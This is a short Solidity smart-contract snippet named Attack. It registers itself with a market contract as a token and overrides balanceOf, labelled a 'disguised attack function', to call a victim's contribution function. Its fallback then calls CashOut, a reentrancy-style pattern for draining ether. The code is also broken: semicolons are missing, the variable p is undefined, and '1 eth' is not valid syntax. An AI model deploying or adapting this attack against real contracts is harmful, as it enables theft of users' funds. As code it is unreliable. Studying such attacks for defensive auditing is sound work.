contract Attack is MifflinToken {
    address victim;
    address market;
    constructor() payable {}

    function setVictim(address _vic, address _market) {
        victim = _vic
        market = _market
    }

    function prepareAttack() {
        market.call(bytes4(keccak256("setToken(uint8, address)")), 1, this);
    }

    function balanceOf(MifflinToken token) public {   // Disguised attack function
        victim.call.value(1 eth)(bytes4(keccak256("contribution(uint256)")), 10);
    }

    function() payable{
        p.CashOut(1 eth);
    }

    function getvalue() returns (uint) {
        return this.balance;
    }
}